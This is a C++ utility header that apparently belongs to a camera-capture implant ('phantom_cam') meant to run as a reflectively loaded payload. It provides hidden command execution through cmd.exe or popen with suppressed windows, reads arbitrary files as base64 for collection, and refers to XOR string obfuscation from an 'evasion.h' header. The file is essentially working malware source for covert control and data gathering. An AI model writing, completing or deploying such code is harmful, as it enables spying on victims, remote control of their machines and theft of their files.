#pragma once
// ============================================================================
//  media_utils.h — Shared utilities for media capture modules
// ============================================================================

#include <string>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <fstream>
#include <cstring>
#include "crypto.h"

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
#else
    #include <sys/utsname.h>
    #include <unistd.h>
#endif

// ── Shared Helper Functions ───────────────────────────────────────────────────

namespace media_utils {

inline void xtrace(const char* msg) {
#ifdef _WIN32
    char tmp[MAX_PATH] = {0};
    if (!GetTempPathA(MAX_PATH, tmp)) return;
    std::string p = std::string(tmp) + "phantom_cam_trace.log";
    HANDLE h = CreateFileA(p.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(h, msg, (DWORD)lstrlenA(msg), &w, nullptr);
    WriteFile(h, "\r\n", 2, &w, nullptr);
    CloseHandle(h);
#endif
}

inline std::string exec_cmd(const std::string& cmd) {
    std::string output;
#ifdef _WIN32
    // Native CreateProcess + pipe. The previous `_popen` implementation
    // crashed reflective (manually mapped) payloads at rip=0x3000000000 the
    // first time a media module spawned a child process (camera WIA
    // fallback): the UCRT stdio/spawn machinery cannot be used from a
    // reflectively loaded image. kernel32 APIs (proven working in this
    // context) replace it entirely -- no CRT stdio in the path.
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    HANDLE rd = nullptr, wr = nullptr;
    xtrace("x:enter");
    if (!CreatePipe(&rd, &wr, &sa, 0)) { xtrace("x:pipe-fail"); return ""; }
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr;
    si.hStdError = wr;
    PROCESS_INFORMATION pi{};
    std::string full = "cmd.exe /c " + cmd;
    xtrace("x:pre-createproc");
    BOOL ok = CreateProcessA(nullptr, full.data(), nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    xtrace(ok ? "x:proc-ok" : "x:proc-fail");
    CloseHandle(wr);
    if (!ok) { CloseHandle(rd); return ""; }
    DWORD deadline = GetTickCount() + 60000;
    char buf[4096];
    DWORD n = 0;
    size_t total = 0;
    xtrace("x:read-loop");
    while (ReadFile(rd, buf, sizeof(buf), &n, nullptr) && n > 0) {
        output.append(buf, n);
        total += n;
        if (total > (8u << 20)) break;                       // 8 MB cap
        if ((int)(GetTickCount() - deadline) >= 0) break;    // 60 s cap
    }
    xtrace("x:read-end");
    WaitForSingleObject(pi.hProcess, 30000);
    xtrace("x:wait-done");
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(rd);
#else
    FILE* f = popen(cmd.c_str(), "r");
    if (!f) return "";
    char buf[8192];
    while (fgets(buf, sizeof(buf), f) != nullptr) {
        output += buf;
    }
    pclose(f);
#endif
    return output;
}

inline std::string read_file_b64(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return "";
    std::vector<BYTE> buffer;
    char buf[8192];
    while (file.read(buf, sizeof(buf))) {
        buffer.insert(buffer.end(), buf, buf + file.gcount());
    }
    if (file.gcount() > 0) {
        buffer.insert(buffer.end(), buf, buf + file.gcount());
    }
    if (buffer.empty()) return "";
    return "MEDIA_B64:" + crypto::base64_encode(buffer);
}

inline bool file_exists(const std::string& path) {
#ifdef _WIN32
    DWORD attr = GetFileAttributesA(path.c_str());
    return attr != INVALID_FILE_ATTRIBUTES;
#else
    return access(path.c_str(), F_OK) == 0;
#endif
}

inline std::string get_temp_path() {
#ifdef _WIN32
    char tmpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    return std::string(tmpPath);
#else
    const char* tmpdir = getenv("TMPDIR");
    if (!tmpdir) tmpdir = "/tmp";
    return std::string(tmpdir) + "/";
#endif
}

inline std::string join_path(const std::string& base, const std::string& name) {
    std::string result = base;
#ifdef _WIN32
    if (!result.empty() && result.back() != '\\' && result.back() != '/') result += '\\';
#else
    if (!result.empty() && result.back() != '/') result += '/';
#endif
    result += name;
    return result;
}

} // namespace media_utils

// Note: XOR_STR and XOR_DEC macros are already defined in evasion.h
// This header relies on those definitions for string obfuscation
